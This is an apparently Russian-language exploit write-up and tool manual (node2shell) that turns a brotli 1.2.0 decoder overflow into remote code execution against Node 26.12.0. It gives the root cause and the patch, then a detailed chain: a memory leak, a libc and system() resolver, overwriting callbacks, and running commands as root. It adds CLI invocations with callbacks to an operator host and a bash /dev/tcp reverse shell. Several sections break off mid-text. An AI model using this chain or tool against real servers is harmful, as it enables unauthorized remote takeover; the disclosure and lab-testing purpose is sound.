## 2. Причина

`DecodeBlockTypeAndLength()` в brotli 1.2.0 возвращает `BROTLI_BOOL` и
смешивает три разных исхода: успех, нехватку входа и структурно невозможный
block switch. Для дерева дистанций при `num_block_types[2] == 1` любая попытка
переключения блока невозможна, но код возвращает то же `BROTLI_FALSE`, что и
при нехватке байт:

```c
static BROTLI_INLINE BROTLI_BOOL DecodeBlockTypeAndLength(
    int safe, BrotliDecoderState* s, int tree_type) {
  ...
  if (max_block_type <= 1) {
    return BROTLI_FALSE;
  }
```

Обёртки `DecodeLiteralBlockSwitch`, `DecodeCommandBlockSwitch` и
`DecodeDistanceBlockSwitch` на быстром пути возвращали `void`, поэтому
результат терялся. На безопасном пути макрос `BROTLI_SAFE` трактовал любое
`false` как `NEEDS_MORE_INPUT`:

```c
#define BROTLI_SAFE(METHOD)                       \
  {                                               \
    if (safe) {                                   \
      if (!Safe##METHOD) {                        \
        result = BROTLI_DECODER_NEEDS_MORE_INPUT; \
        goto saveStateAndReturn;                  \
      }                                           \
    } else {                                      \
      METHOD;                                     \
    }                                             \
  }
```

Отсюда два следствия. На безопасном пути декодер возвращает «нужен ввод», не
потребив ни бита, и открывает ветку копирования остатка входа во внутренний
буфер. На быстром пути результат `void`-обёртки исчезает, `block_length[1]`
остаётся нулём, `goto CommandBegin` не двигает состояние, и декодер уходит в
бесконечный цикл. Второй сценарий даёт отказ в обслуживании, первый даёт
переполнение.

### 2.1 Внутренний буфер

Поле в структуре:

```c
  union {
    uint64_t u64;
    uint8_t u8[8];
  } buffer;
  brotli_reg_t buffer_length;
```

Абсолютные смещения на x86_64: `buffer` 72, `buffer_length` 80, `pos` 88,
`ringbuffer` 136, `metadata_start_func` 720, `metadata_chunk_func` 728,
`metadata_callback_opaque` 736. Размер структуры 5744. Раскладка проверена
через `offsetof`, для перечисленных полей совпадает с aarch64.

В `BrotliDecoderDecompressStream` есть две записи в буфер:

```c
            BROTLI_DCHECK(s->buffer_length < 8);
            s->buffer.u8[s->buffer_length] = **next_in;
            s->buffer_length++;
...
          while (*available_in) {
            s->buffer.u8[s->buffer_length] = **next_in;
            s->buffer_length++;
```

Первая ветка добавляет по одному байту и защищена только `BROTLI_DCHECK`,
который в release-сборке раскрывается в пустоту. Вторая ветка, копирование
хвоста при `buffer_length == 0`, не проверяет границу вообще. Формулировка
advisory про запись за 8-байтовый буфер относится к обеим веткам, но в
исходнике важно уточнение: DCHECK стоит в ветке `buffer_length != 0`, а
безусловный `while` стоит в ветке копирования хвоста.

Ключевая деталь для эксплуатации: `s->buffer_length++` перечитывает поле из
памяти после записи байта. Если записать байт по индексу 8, меняется сам
счётчик, и курсор уходит не на 9, а на новое значение. В Node 26.12.0 это
видно в дизассемблере:

```
0x229b23d  mov BYTE PTR [r14+rax*1+0x48],cl   ; state + 72 + BL
0x229b242  mov rax,[r14+0x50]                 ; перечитать BL
0x229b24a  mov [r14+0x50],rcx                 ; BL = (изменённый store'ом BL)+1
```

То есть переполнение работает как state-relative курсор записи, которым
управляет содержимое хвоста.

## 3. Достижимость

Аргумент «структурной недостижимости» опирается на `MLEN <= 2^24`. Но
максимальная длина блока, которую можно закодировать в заголовке, больше:
символ 25 таблицы префиксов даёт `16625 + (2^24 - 1) = 16 793 840`.
`BROTLI_BLOCK_SIZE_CAP` равен `2^24`, а `block_length[t]` инициализируется
этим значением.

При `NBLTYPES = [1, 2, 1]`:

* `block_length[1] = 16 793 840`, этот счётчик не исчерпается;
* `block_length[2] = 2^24`, исчерпается на 2^24-й команде;
* `meta_block_remaining_len` остаётся `2^24`, если команды не дают выхода.

Нулевой выход даёт словарная ссылка: `insert 0`, `copy 4`, `NPOSTFIX=3`,
дистанция `34817`, адрес `34816`, transform 34 (`OMIT_FIRST_4`), слово длины
4 обрезается в 0 байт. `pos` не меняется, `rem` не уменьшается, а счётчики
блоков тикают вниз. В минимальной форме команда стоит 11 бит, это только
`dist_extra`; 2^24 команд дают 23 068 672 байта тела. Измеренный поток с
заголовком занимает 23 068 690 байт и оставляет декодер в состоянии:

```
r=NEEDS_MORE_INPUT err=2 consumed=23068690/23068690 out=0
state=9 buf_len=0 nbt=[1,2,1] bl=[16777216,16623,0] mbrl=16777216 pos=0
```

Следующая команда доходит до `CommandPostDecodeLiterals`, видит
`block_length[2] == 0` и вызывает distance-switch при `num_block_types[2] == 1`.
В 1.2.0 это «нужен ввод», в 1.2.1 это ошибка `-17`.

Двадцатибайтовый регрессионный вход из Node advisory падает раньше, потому
что `WriteRingBuffer` проверяет `meta_block_remaining_len < 0` до копирования
хвоста и возвращает `-9`. Поток с 2^24 нулевых команд держит
`meta_block_remaining_len` положительным, поэтому проверка проходит.

## 4. Патч

Upstream-фикс `0ed4268a` меняет тип возврата функции и разводит три исхода:

```c
static BROTLI_INLINE BrotliDecoderErrorCode DecodeBlockTypeAndLength(
    int safe, BrotliDecoderState* s, int tree_type) {
  ...
  if (max_block_type <= 1) {
    return BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH;
  }
```

Обёртки становятся `BrotliDecoderErrorCode`-функциями, а новый макрос
пробрасывает статус в обоих режимах:

```c
#define BROTLI_SAFE_WITH_STATUS(METHOD)         \
  {                                             \
    BrotliDecoderErrorCode status;              \
    if (safe) {                                 \
      status = Safe##METHOD;                    \
    } else {                                    \
      status = METHOD;                          \
    }                                           \
    if (status != BROTLI_DECODER_SUCCESS) {     \
      result = status;                          \
      goto saveStateAndReturn;                  \
    }                                           \
  }
```

Заменены три вызова: command switch, distance switch, literal switch. Важно,
что исправлен и быстрый путь: раньше ошибка там терялась, теперь
`DecodeDistanceBlockSwitch` не может провалиться в `--block_length[2]` с
последующим заворотом счётчика. Новый код ошибки занял ранее
зарезервированное значение `-17`:

```c
  BROTLI_ERROR_CODE(_ERROR_FORMAT_, DISTANCE, -16) SEPARATOR
  BROTLI_ERROR_CODE(_ERROR_FORMAT_, BLOCK_SWITCH, -17) SEPARATOR
```

В Node это `ERR__ERROR_FORMAT_BLOCK_SWITCH`, `errno -17`. Константа
экспортируется коммитом `b5f41529df`, cherry-pick в `deps/brotli` сделан
коммитом `49dff6f57a`.

Патч добавляет в разбор заголовка метаблока только `BROTLI_DCHECK`:

```c
        result = DecodeMetaBlockLength(s, br);  /* Reads 2 - 31 bits. */
        if (result != BROTLI_DECODER_SUCCESS) {
          break;
        }
        BROTLI_DCHECK(s->meta_block_remaining_len <=
                      (int)BROTLI_BLOCK_SIZE_CAP);
```

Это фиксация инварианта, а не новая проверка границ буфера. Код копирования
в `buffer` в 1.2.1 идентичен 1.2.0. Патч убирает состояние, в котором
остаток входа перестаёт быть не больше 8 байт. Если появится другой способ
получить `NEEDS_MORE_INPUT` без потребления входа, тот же примитив вернётся.

### 4.1 Заголовок метаблока

Порядок битов, который нужен для METADATA:

1. `ISLAST`, 1 бит. Если 1, читается `ISLASTEMPTY`, 1 бит; `1,1` означает
   конец потока.
2. `NIBBLES`, 2 бита. Значение 3 означает metadata.
3. `RESERVED`, 1 бит, обязан быть 0.
4. `MSKIPBYTES`, 2 бита. При 0 длина метаданных 0, колбэк всё равно
   вызывается. При `b > 0` читаются `b` байт длины LE, старший байт не 0.
5. `BrotliJumpToByteBoundary`, паддинг до границы байта должен быть нулевым.
6. Затем читаются `len` байт метаданных.

Заголовок разбирается по подсостояниям `substate_metablock_header`, поэтому
границы чанков на него не влияют. Измерено: позиция парсера после `i`
литералов равна 692 битам при `n=62` и 660 при `n=58`, то есть
`client_bit_offset + 8*(n+24)`. Значение не зависит от доставки: 151 байт
одним чанком, 88 байт одним чанком и 151 отдельный write дают одну и ту же
позицию.

## 5. Стенд

`lab/` поднимает пять сервисов: уязвимый и исправленный декодер, приложение
с `fetch()`, а также те же уязвимый и исправленный декодер за HTTPS. Для
полной цепочки используется официальный `node:26.12.0-bookworm-slim` и
`node:26.12.1-bookworm-slim` с приложением, которое отдаёт сырой `br` в
`zlib.createBrotliDecompress()` и не завершает поток. Для вектора (b)
поднимается приложение, которое вызывает `fetch()` по адресу атакующего.
HTTPS-сервисы используют `lab/https-stream.js`, тот же потоковый декодер
поверх `https.createServer()`, и самоподписанный сертификат из
`lab/certs/`, который создаёт `run-lab.sh` через `openssl`.

Требования:

* Python 3.10+ и стандартная библиотека, сторонних пакетов нет;
* Docker и Docker Compose на машине оператора;
* цель на linux x86_64;
* приложение декодирует тела с `Content-Encoding: br` (вектор a) или само
  вызывает `fetch()` по URL атакующего (вектор b);
* сетевой доступ от цели к callback-серверу оператора для режима `-C`;
* для reverse shell сетевой доступ от цели к TCP-listener оператора.

Запуск стенда:

```bash
cd lab
./run-lab.sh
```

Порты и имена сервисов перечислены в `lab/docker-compose.yml`:
`decode-vuln` 19800, `decode-patched` 19801, `fetch-vuln` 19802,
`https-vuln` 19810, `https-patched` 19811. В примерах
ниже встречаются 19600 и 19601: это проверенная пара контейнеров, роли в
compose те же.

Для проверки полного HTTPS-прогона используется edge-терминатор
`lab/tls-tunnel.js`: он слушает TLS и передаёт расшифрованные байты без
изменений в обычный HTTP-декодер (`decode-vuln`/`decode-patched`).
Терминаторы поднимаются отдельными контейнерами (сертификаты создаёт
`run-lab.sh`):

```bash
docker run -d --name lab-tls-tunnel-vuln -p 127.0.0.1:19816:3446 \
  -v "$PWD/lab":/app:ro -e PORT=3446 \
  -e UPSTREAM_HOST=172.17.0.1 -e UPSTREAM_PORT=19800 \
  node:26.12.0-bookworm-slim node /app/tls-tunnel.js
docker run -d --name lab-tls-tunnel-patched -p 127.0.0.1:19817:3446 \
  -v "$PWD/lab":/app:ro -e PORT=3446 \
  -e UPSTREAM_HOST=172.17.0.1 -e UPSTREAM_PORT=19801 \
  node:26.12.0-bookworm-slim node /app/tls-tunnel.js
```

`UPSTREAM_HOST`: адрес docker-хоста со стороны контейнера
(`172.17.0.1` для default bridge; подставьте свой gateway). Полный прогон:

```bash
python3 node2shell.py -u https://127.0.0.1:19816/ -k -m request \
  -L OPERATOR_IP -C -c id -t 40 --resolve-workers 8
```

Прямые TLS-сервисы `https-vuln`/`https-patched` (TLS внутри приложения)
годятся для константного `--got` и для отрицательного контроля, но не для
полного 1255-чтениевого рантайм-прогона: см. раздел «TLS и https» и
`evidence/runtime-both.md`, §5.

### 5.1 CLI

```bash
git clone https://github.com/wwlamer/node2shell.git
cd node2shell
python3 node2shell.py -h
python3 node2shell.py -u http://127.0.0.1:19600 -c 'touch /tmp/n2s_blind'
python3 node2shell.py -u http://127.0.0.1:19600 -C -L OPERATOR_IP -c 'id; uname -a'
python3 node2shell.py -u https://127.0.0.1:19810/decode -k -C -L OPERATOR_IP -c 'id'
```

По умолчанию режим `auto`: инструмент проверяет вектор (a), затем вектор (b).
Команда выполняется в слепом режиме: listener для её вывода не поднимается.
Режим `-C`/`--callback` включает сбор вывода на HTTP-сервер оператора.
Целевой эндпоинт чтения файлов не нужен и не предполагается.

| Флаг | Значение |
|---|---|
| `-u, --url` | адрес цели, он же позиционный аргумент |
| `-c, --cmd` | команда для `system()`, по умолчанию `id` |
| `-m, --mode` | `auto`, `request`, `response` |
| `-L, --lhost` | адрес оператора, доступный цели (callback или reverse shell) |
| `-P, --lport` | порт listener оператора |
| `-C, --callback` | сбор вывода команды на HTTP-сервер оператора |
| `-r, --reverse` | обратная оболочка на `-L` и `-P`; слепой путь |
| `--leak` | только лик libc и состояния, без записи тройки |
| `-l, --lib` | libc цели для смещений `execvp` и `system` |
| `--runtime` | резолвить базу libc и `system` в рантайме, режим по умолчанию |
| `--got` | fallback: адрес `execvp@GOT` (для официальной 26.12.0 `0x7359140`) |
| `--resolve-workers` | параллельных чтений резолвера, по умолчанию 4 |
| `-k, --insecure` | не проверять TLS-сертификат цели (`https`) |
| `-s, --save` | сохранить дампы лика и среза |
| `-t, --timeout` | общий таймаут, по умолчанию 90 секунд |
| `--plain` | без цвета, `NO_COLOR` действует так же |
| `-j, --json` | машинный вывод, баннер в stderr |
| `-q, --quiet` | только вердикт и вывод команды |
| `-v, --version` | версия |
| `-h, --help` | справка |

Актуальный список флагов всегда печатает `node2shell.py -h`; таблица выше
описывает контракт режимов.

Режимы различаются только командой и способом доставки вывода:

* blind, режим по умолчанию: listener не поднимается, вывод команды не
  собирается. Успех не наблюдается в самом канале, поэтому команда должна
  иметь собственный проверяемый эффект. Начальный лик состояния при этом
  обязателен: цель должна отдать декодированный поток первого запроса,
  иначе адрес состояния взять неоткуда;
* `-C`, `--callback`: HTTP-listener оператора поднимается автоматически,
  адрес и порт можно задать через `-L` и `-P`. Команда на цели отправляет
  результат на callback минимальным `node -e` (цель это Node.js), инструмент
  печатает полученный вывод;
* `--leak`: только лик libc и состояния, без записи тройки и без вызова
  `system()`;
* reverse shell: `-r` вместе с `-L` и `-P` формирует команду
  `bash /dev/tcp` или `nc`, listener держит оператор. HTTP-listener
  инструмента в этом режиме не поднимается.

#### TLS и https

Схема `https` в адресе цели включает TLS в том же сокете, отдельного кода
цепочки нет: `RequestChannel` и `RelayChannel` оборачивают соединение через
`ssl.create_default_context()`. Проверка сертификата и имени хоста по
умолчанию включена. `-k`/`--insecure` выключает её для самоподписанных
стендов. TLS относится только к каналу до цели: callback-сервер оператора и
URL, который цель забирает через `fetch()` в векторе (b), остаются `http`.

Объект `SSLSocket` не безопасен для одновременных операций: `SSL_read` в
потоке-читателе и `SSL_write` в потоке, отправляющем 27-МБ фазу, портят
BIO и роняют интерпретатор (`SIGSEGV` в `SSL_write_ex2` → `BIO_write`).
Поэтому канал держит один лок на все `sendall`/`recv` одного соединения, а
читатель стартует лениво, уже после записи: эксплойт никогда не читает во
время отправки фазы. Читатель ждёт `selectors.DefaultSelector` (epoll) и
`pending()` и закрывается через `stop()`+`join` до `close()`. На
транспортных ошибках чтение повторяется (4 попытки). Тело полного чтения : 
около 16,9 КБ, поэтому оно принимается только после того, как стабилизировалось
и превысило 1 КБ: короткий ответ из 4-байтовой преамбулы, который перестал
расти, считается оборванным чтением и повторяется на новом соединении, а не
«штатным `-17`» и не результатом. Преамбула никогда не принимается за
ответ: пауза до 20 с между кусками не финализирует чтение (медленные и
эмулируемые цели отдают ~16,9 КБ позже первых 4 байт), а ошибка «4 байта»
выдаётся только после 4 попыток. На патченной 26.12.1 тело так и не растёт,
поэтому отказ занимает до ~4×20 с. Для QEMU/arm64 и вообще медленных целей
держите 4 воркера (значение по умолчанию): на QEMU 8 потоков растягивают
паузы между кусками. Проверено: 400/400 чтений на 8
потоках и полные прогоны по 1255 чтений без падений и без ретраев.

Сертификат не влияет на цепочку: адрес `execvp@GOT`, смещения libc, потоки и
срез состояния те же, что и по HTTP. Сама TLS-обвязка не меняет байты
резолвера.

Прямой TLS (TLS терминируется внутри приложения): Node TLSWrap отдаёт
приложению расшифрованные куски ≤16 КБ, но границы вызовов декодера при
этом безопасны: на всех 1664 границах 16-КБ разбиения `GetAvailIn == 0`,
`buffer_length == 0`, хвост приходит отдельным вызовом `avail == 17`, а
tail-copy кладёт `T` ровно в `state+168` (`context_map_slice`). Реальная
причина прежних падений: продолжение после tail-copy: декодер разбирает
собственный struct как вход, первый добавленный байт follow-up переписывает
младший байт `dist_context_map_slice`, и повреждённая карта контекстов даёт
`dist_htree_index` 0..255. При одном distance-дереве это чтение за границей
массива `htrees[]` → дикий `HuffmanCode*` → SIGSEGV в `ProcessCommands`.
Исправление в фазе: 256 одинаковых distance-деревьев (любой индекс 0..255
остаётся валидным) и `t[0] = 0x04` (первый forge-литерал по-прежнему в
позиции вывода 12, контекст 0). Проверено: прямой `https://…:19812/` +
`-k`, 1/1 полный рантайм-прогон, `uid=0(root)`, 1255 чтений, резолвер
239 с, 0 падений цели; 128/128 чтений ELF-заголовка без падений;
отрицательный контроль 26.12.1 (`https://…:19813/`), 4 байта и `-17`,
процесс жив. Терминатор (`lab/tls-tunnel.js`) остаётся равнозначным
вариантом. Детали: `evidence/runtime-both.md`, §5.

#### Runtime-резолвер libc и system (по умолчанию)

Runtime-резолвер работает в обоих векторах. В request-векторе он сам
отправляет фазу на цель и читает ответ. В response-векторе инструмент
поднимает `/feed`, цель забирает этот URL и отдаёт декодированные байты;
каждое чтение получает свой токен `/feed?token=…`, поэтому параллельные
чтения не перемешиваются. Для response нужен консьюмер, который декодирует
тело ответа явным `zlib.createBrotliDecompress()` (`lab/fetch-zlib.js`):
встроенный в undici авто-декодер использует `BROTLI_OPERATION_FLUSH`, и
tail-copy примитив на этой фазе падает в `ProcessCommands` (SIGSEGV) на
части чтений. request-вектор этого ограничения не имеет.

По умолчанию в пути нет ни адреса GOT, ни смещений libc, ни слота
`DT_DEBUG`. Первым делом инструмент читает срез состояния (A/B-view, тот же
поток, что и для лика состояния) и достаёт из него `context_lookup`
(`state+0xa0`, бит view 672). Дальше путь зависит от сборки:

* **non-PIE (ET_EXEC)**: статические данные лежат низко, `context_lookup`
  попадает в образ главного исполняемого файла. Читается ELF по `0x400000`:
  `e_phoff`/`e_phentsize`/`e_phnum`, затем `PT_DYNAMIC` и скан `d_tag` в
  `.dynamic`. `DT_DEBUG` даёт `r_debug`, оттуда `r_map` и список `link_map`;
  по `l_name` находится libc, `l_addr` это база, `l_ld` это её `.dynamic`.
* **PIE (ET_DYN)** — `0x400000` не замаплен, читать туда нельзя (SIGSEGV).
  `context_lookup` указывает в `.rodata` libbrotlicommon; её база ищется
  сканом вниз по страницам до ELF-заголовка (`7f 45 4c 46`) с проверкой
  `e_type=ET_DYN`. Фиксированного смещения таблицы нет (в 1.2.0 это 3
  страницы, 9 байтовых чтений). Затем `PT_DYNAMIC` libbrotlicommon, таблица
  `DT_RELA`/`DT_JMPREL`: берётся внешний (eager `GLOB_DAT`, на glibc это
  `__cxa_finalize`) GOT-указатель, по нему скан страниц вниз до ELF-заголовка
  даёт базу libc. База главного исполняемого файла не нужна и не ищется.
  Путь рассчитан на shared `libbrotlicommon`; PIE-сборка со статическим
  brotli внутри executable не поддерживается. Скан предполагает непрерывную
  замапленность сегментов библиотеки от базы (для измеренных 1.2.0 так и
  есть); экзотическая раскладка с незамапленными страницами-зазорами может
  оборвать процесс.

В libc по `DT_GNU_HASH`/`DT_STRTAB`/`DT_SYMTAB` ищется `system`, `st_value`
прибавляется к базе. Обе ветки используют один и тот же байтовый примитив.

PIE-путь измерен на host `node v26.10.0` (ET_DYN) с matching vulnerable
build brotli 1.2.0 (`-O0`, LD_PRELOAD): `ELF 0x7f9cc3758000 (brotli-pie,
скан 2 стр.), база libc 0x7f9cc1c00000, system 0x7f9cc1c54740 (sym 1066),
чтений 1192, 690 с` при 4 потоках до callback; полный прогон:
`uid=1000(walter)` (цель не root). Обе базы совпали с `/proc/<pid>/maps`.
Скан базы libbrotlicommon — 2 шага, 9 байтовых чтений; фиксированного
смещения таблицы нет.
Системный `libbrotlidec.so.1.2.0`, собранный GCC `-O2`, примитив не взводит:
tail-copy делает qword-store `buffer_length` (BL=20 вместо 4628), поэтому на
стоковом Arch-хосте лик состояния = 0 байт. PIE-путь требует vulnerable
brotli с `incq`-кодогенерацией (официальные node-сборки) либо пересборки;
подробности и логи: `evidence/pie.md`.

Чтение идёт отдельным примитивом `context_map_slice`: байт цели используется
как индекс `htrees[]`, а не как запись Huffman-таблицы, поэтому ограничения
на соседний байт нет. Один байт за прогон: фаза 27.26 МБ, 17-байтовый хвост
с `J=95` пишет `context_map_slice` на `state+168`, follow-up читает байт.
На официальной 26.12.0 это около 1255 чтений, 337-350 с при 4 потоках,
около 34 ГБ трафика. Request-вектор: полный прогон 460-472 с; response:
резолвер 337 с, полный прогон 352 с. На 8 потоках 1255 чтений занимают
222-233 с (HTTP и HTTPS через терминатор). После сериализации SSL-операций
4 и 8 потоков стабильны; 400/400 чтений и полные прогоны проходят без
SIGSEGV.

#### Быстрый fallback --got

`--got АДРЕС` оставляет прежний путь: `execvp@GOT` из
`0x7359140` (для официальной `node:26.12.0-bookworm-slim` linux x86_64,
non-PIE), плюс смещения `execvp`/`system` из `-l` или проверенного образа.
Для другой сборки нужен свой `--got`. Сам `--got`-путь PIE не резолвит
(адрес GOT задаётся вручную); для PIE используйте runtime-резолвер по
умолчанию (`context_lookup` → libbrotlicommon → GOT → libc).
Эксплойт сетевой и не требует доступа к файлам цели, но не универсальный:
адреса не угадываются.

### 5.2 Что должно быть на цели

Вектор (a) требует, чтобы приложение декодировало тело запроса с
`Content-Encoding: br` и отдавало декодированный поток первого запроса
обратно. Голый `node:http` без декодирования не уязвим через этот вектор: он
просто получает байты. Проверенный живой прогон использовал потоковый
декодер (`zlib.createBrotliDecompress()`), который отдаёт декодированные
байты обратно и не уничтожается, пока запрос открыт.

Это требование относится ко всем режимам, включая blind. Blind убирает
только сбор вывода команды; лик состояния всё равно читается из
декодированного потока первого запроса, потому что адрес состояния
вычисляется из этого среза. Если приложение декодирует тело и выбрасывает
результат, среза нет, адреса состояния нет и эксплуатация не работает ни в
одном режиме.

Чистая конфигурация для вектора (a) проверена на Express 5: маршрут
`/decode` создаёт `zlib.createBrotliDecompress()`, пишет в него тело запроса
и отдаёт выход декодера клиенту, без собственных эндпоинтов чтения файлов
(`lab/express-stream.js`). Буферизующий body-parser для этой цепочки не
подходит: он собирает тело целиком и не отдаёт выход декодера до конца
запроса, а лик состояния читается именно из выходного потока.

Вектор (b) требует, чтобы приложение само вызывало `fetch()` по URL
атакующего и отдавало тело через явный `zlib.createBrotliDecompress()`.
Авто-декодер undici (`BROTLI_OPERATION_FLUSH`) ломает tail-copy: цель падает
SIGSEGV примерно на 25-50% чтений. `Content-Encoding: br` на стороне
атакующего нужен, `Accept-Encoding` на цели не требуется. В режиме `-C`
вывод команды забирает callback-сервер оператора, поэтому остальной ответ
приложения может быть любым; в blind вывод не собирается.

## 6. Цепочка

#### Runtime-резолвер (по умолчанию)

Цепочка (non-PIE): `ELF@0x400000 -> PT_DYNAMIC -> d_tag -> DT_DEBUG ->
link_map -> libc l_addr/l_ld -> libc .dynamic -> GNU hash(system) ->
st_value`. Цепочка (PIE): `state-view -> context_lookup -> libbrotlicommon
base -> PT_DYNAMIC -> DT_RELA/DT_JMPREL -> GOT(__cxa_finalize) -> скан страниц
-> libc base -> libc .dynamic -> GNU hash(system) -> st_value`.
Константы `0x7359140`, `0x7358740`, `0x7358870`, `0xd4f00`, `0x4c490` в этом
пути не используются. Живой прогон на официальном контейнере:

```
[+] runtime: база libc 0x7f3e90afd000, system 0x7f3e90b49490 (sym 1024), чтений 1255, 350 с
[+] RCE подтверждён: system() выполнил команду
uid=0(root) gid=0(root) groups=0(root)
```

### 6.1 Лик libc (--got fallback)

Первый запрос. Поток завершает марафон в состоянии `state=9`, `bl2=0`,
`BL=0`, `rem=8`, `bit_pos_=20`. Хвост из 17 байт с `J=63` переписывает
`state+136..143`, то есть `ringbuffer`. В качестве `rb` берётся
`execvp@GOT`, в качестве `W = rb + P` берётся дырка в `.bss`. На триггере
pending distance `d = P` даёт `src_start = (P - d) & mask = 0`, LZ77-копия
переносит 16 байт из GOT в `W`, а финальный flush читает `W` и отдаёт 8
байт `GOT[execvp]` в ответ. Смещение в выводе `P = 323012`.

Для bookworm: `execvp` имеет смещение `0xd4f00`, `system` имеет смещение
`0x4c490`. База libc странично выровнена, поэтому `system` вычисляется
арифметически. Для Arch смещения другие: `execvp 0xe6e70`, `system 0x54740`.
Их можно передать через `-l libc.so.6`, иначе используются смещения
тестового образа.

### 6.2 Лик состояния

Второй запрос, тот же процесс. Марафон из 2^24 нулевых команд, затем
20-байтовый хвост с BL-jump и 1-байтовый триггер запускают pending insert
38000 литералов. Литеральное дерево `{0x41, 0x42}` кодирует один бит на
литерал, поэтому выход является побитовым образом памяти состояния, один
байт выхода на бит.

Нужен self-pointer внутри структуры. Поле `arena.header.symbol_lists` лежит
по `state+0x410` и указывает на `state+0x438`. Оно выживает, если арена не
затёрта `CalculateDistanceLut`. Условие: алфавит дистанций
`16 + ndirect + (24 << (NPOSTFIX+1))` не больше 192. При `NPOSTFIX=0` это 64,
при 1 это 112, при 2 это 208, при 3 это 400. На `NPOSTFIX=3` LUT затирает
`symbol_lists`.

Отображение среза:

```
out_byte_index = (state_offset - 72) * 8 - 32
s->ringbuffer (state+136)         -> out[480]
arena.header.symbol_lists (0x410) -> out[7712]
state = le_bits(out[7712..7776], A=0/B=1) - 0x438
```

Сдвиг `-32` является свойством этого потока. Калибровка
`out[480..544] == s->ringbuffer` обязательна.

### 6.3 Запись тройки

После лика состояния тот же декодер продолжает работу. MB1 имеет `ISLAST=0`
и `rem=38000`, поэтому после 38000 литералов он завершает метаблок, а не
поток. MB2 состоит из 2^24 нулевых команд и завершается с `bl2=0`. Хвост из
17 байт с `J=63` ставит

```
rb = state + (720 - n - garbage) - pos0
```

где `n = strlen(cmd) + 1`. Pending insert пишет `garbage + n + 24` литералов,
начиная с `rb + pos0 = state + 720 - n - garbage`. В отчётах этот приём
называется D2: литеральный fast-path пишет ровно `i` байт, начиная с
`rb[pos]`, и не зависит от `pos`, если clamp не сработал. Payload:

```
cmd\0 | system | NULL | state+720-n
```

Строка команды лежит в `[720-n .. 719]`, тройка в `720/728/736`,
`opaque = state+720-n`. Последний записанный байт 743, до
`substate_metablock_header` остаётся 8 байт. `rem` на bail равен ровно `i`,
поэтому `CommandPostDecodeLiterals` видит `METABLOCK_DONE` до исполнения
copy-части Y-команды.

Геометрия выводится автоматически:

```python
i = garbage + n + 24
S = (11 - 7) + 2 + insert_extra
garbage = 72 - S // 8
client_bit_offset = S % 8
```

Ограничения: `720 - n >= 440`, то есть `n <= 280`; `rbsz - pos > i - 1`,
чтобы clamp не укоротил прогон. Проверены `n=13`, `n=37`, `n=58`, `n=62` и
`n=100`. С `n >= 227` геометрия переходит на structure 14 и insert code 18
(8-битная insert-длина): этот путь не верифицирован и роняет цель SIGSEGV
без вызова `system()` (свежий `node:26.12.0`: `n≈182`, `uid=0(root)`,
`n=259`, `exit 139`), поэтому инструмент отклоняет `n >= 227`; предел: `n <= 226`.

### 6.4 METADATA и вызов

Клиентский чанк содержит `client_bit_offset` нулевых бит, затем `n+24`
литеральных кода payload, затем заголовок METADATA:

```
ISLAST=1, ISLASTEMPTY=0, NIBBLES=3 (metadata),
RESERVED=0, MSKIPBYTES=1, len-1 (один байт),
нулевой паддинг до границы байта, затем len байт метаданных
```

Позиция заголовка:

```
hdr_bit = client_bit_offset + 8 * (n + 24)
```

Для `n=62` это 692, для `n=58` это 660. Оба значения совпали с позицией
парсера.

Декодер вызывает:

```c
          if (s->metadata_start_func) {
            s->metadata_start_func(s->metadata_callback_opaque,
                                   (size_t)s->meta_block_remaining_len);
          }
```

`metadata_start_func` равен `system`, `metadata_callback_opaque` равен
`state+720-n`, то есть указывает на строку команды. Второй аргумент `system`
игнорирует. Вызов происходит внутри `BrotliDecoderDecompressStream`, до
любого teardown.

### 6.5 Почему команда дополняется хвостовыми пробелами

Перед разбором заголовка следующего метаблока декодер вызывает
`BrotliDecoderStateMetablockBegin()` (state.c:132), а тот присваивает
`s->dist_htree_index = 0`. Это `uint8_t` по смещению 716, ровно за четыре
байта до `metadata_start_func`. Литеральный прогон пишет строку команды и
тройку в `state+720-n .. 743`, поэтому байт по смещению 716 попадает в конец
команды и обнуляется уже после прогона, но ещё до вызова callback.

Практическое следствие: строка в состоянии обрывается на смещении 716.
Инструмент добавляет к команде четыре хвостовых пробела, тогда ноль попадает
в паддинг. Без паддинга команда обрывалась на три символа раньше: проверено,
что `id > /tmp/zzhost` выполнялось как `id > /tmp/zzh`, а `... 2>&1`
превращалось в `... 2`. С паддингом та же команда выполняется целиком.

тот же прогон идёт через runtime-резолвер (раздел 6.0), даёт те же
`uid=0(root)` и стоит около 8 минут / 34 ГБ на прогон (N=4 в

поэтому до записи тройки и вызова `system()` дело не доходит. Два разных
контроля: sink replay N=10 даёт `-17`, 0 декодированных байт, 0 callback и
живой процесс; packaged CLI на Express-stream/fetch даёт 323012
декодированных байт, затем `-17`, без указателя и без выполнения. Оба
варианта проверены в режимах blind, `-C`, `--leak`, `-r`.

```text
[-] лик не получен: 323012 байт, указателя libc нет
[-] поток отклонён: ERR__ERROR_FORMAT_BLOCK_SWITCH (errno -17), выполнения нет
```

`/health` после инцидента отвечает `200`, процесс жив.

### 7.3 Blind, выполнение без вывода

### 7.4 Reverse shell

TCP-listener оператора:

```bash

```

Reverse shell использует blind-путь. `-L` и `-P` задают адрес и порт
listener, инструмент формирует команду `bash /dev/tcp` и отправляет её тем же
`system()`; `bash` есть в проверенном образе.
HTTP-listener инструмента в этом режиме не поднимается.


`system()` блокирует поток декодера, пока шелл работает. Интерактивная
сессия живёт до закрытия со стороны оператора. После возврата `system()`

## 9. Надёжность и отрицательные результаты

Эксплуатация не перебирает адреса и не требует рестартов. Адрес состояния
ликуется побитовым срезом. По умолчанию база libc и `system` резолвятся в
рантайме через ELF/link_map/GNU hash; `--got` остаётся быстрым fallback и
ликует libc через GOT. Request vector: 50/50 на свежих процессах, 5/5 при повторной
эксплуатации в одном процессе. Лик состояния дополнительно повторён 5/5 на
host и 5/5 в docker.

Отрицательные результаты, без которых цепочка не собралась:

* **Append-walk и pump.** После bail первый append пишет `u8[BL]`, затем
  replay выедает буфер, `buffer_length` сбрасывается, и все следующие append
  идут в `u8[1]`. 40, 180 и 640 шагов по одному байту не доходят до
  `state+720`.
* **Огромный или отрицательный `buffer_length`.** Переход на один байт имеет
  максимум `0xFF00000000000010`. Целевое `2^64-72` потребовало бы около
  7,2e16 шагов и падения на wild store. Запись в `state+0..71`, включая
  `free_func`, недостижима.
* **Один tailcopy на декодер.** `J=15` покрывает `state+88..105`, `J=63`
  покрывает `state+136..153`. Вторая копия получает `n=0`.
* **F1 redirect.** `WriteRingBuffer` даёт управляемый `start`, но окно
